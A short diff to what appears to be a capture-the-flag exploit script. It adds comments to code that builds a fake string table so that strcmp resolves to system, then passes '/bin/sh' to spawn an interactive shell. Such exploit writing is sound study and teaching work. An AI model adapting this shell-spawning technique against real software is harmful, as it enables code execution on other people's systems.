@@ -22,6 +22,7 @@ def quit(answer):
 
 def exploit(r):
     STRTAB = 0x601858
+    # craft fake STRTAB
     payload = "A"*83
     payload += "system\0"
     payload += "A"*(127-len(payload))
@@ -36,7 +37,7 @@ def exploit(r):
 
     deleteNote(3)
     
-    quit("/bin/sh\0")
+    quit("/bin/sh\0") # strcmp() will now resolve to system@libc :)
     r.interactive()
 
 if __name__ == "__main__":
